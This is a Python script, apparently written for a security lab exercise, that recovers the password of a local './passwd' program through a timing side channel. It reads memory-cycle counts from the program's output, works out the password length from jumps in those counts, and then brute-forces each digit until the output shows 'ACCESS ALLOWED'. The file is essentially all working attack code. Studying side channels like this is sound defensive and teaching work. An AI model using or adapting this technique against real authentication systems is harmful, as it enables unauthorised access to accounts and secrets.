import subprocess

val=1
passlen=0
Arr = [0]
Arr.pop()
prev=0

# Loop for the length check.
while True: 

    # Command to start the passwd.c program and provide input in stdin.
    process = subprocess.Popen(["./passwd"],stdin=subprocess.PIPE,stdout=subprocess.PIPE)
    process.stdin.write(str(val)+"0")                               # added "0" because the passwd.c program removes the last character.
    output = process.communicate()[0]
    
    nums = [int(i) for i in output.split() if i.isdigit()]          # extracting mem cycles from output
    memcycs = nums[0]
    
    # Condition to check if password contains "0", otherwise it'll take "1" into consideration

    if prev==0:
        prev=memcycs
    else:
        if abs(prev-memcycs)>100:
            if passlen==1:
                if prev>memcycs:
                    passlen=0
            break
    
    passlen+=1
    val = val + (10**passlen)
    
print("Password length is: "+ str(passlen+1))
# Bookkeeping
val = 0
prev=0
index=passlen
passw = [0]
passw.pop()
for i in range (passlen+1):
    passw.append(0)

place=0

# Loop for individual characters.
while place<=passlen:

    #Loop for each digit from 0-9
    while val<=9:
        process = subprocess.Popen(["./passwd"],stdin=subprocess.PIPE,stdout=subprocess.PIPE)

        # Creating the input
        input = ""
        for i in range (passlen+1):
            input = input + str(passw[i])
        input = input + "0"
        print(input[0:-1])

        process.stdin.write(input)
        output = process.communicate()[0]
        #print(output)

        # If Access is allowed then exit.
        if(output.find("ACCESS ALLOWED")>-1):
            print("The password is: "+input[0:-1])
            exit()

        # Extracting mem cycles from output
        nums = [int(i) for i in output.split() if i.isdigit()]          
        memcycs = nums[0]
    
        # Condition to check if password contains "0", otherwise it'll take "1" into consideration

        if prev==0:
            prev=memcycs
        else:
            if abs(prev-memcycs)>100:
                if val==1:
                    if prev>memcycs:
                        passw[place]=0
                break
        val+=1
        passw[place]+=1

    val=0
    prev=0
    place+=1

process.stdin.close()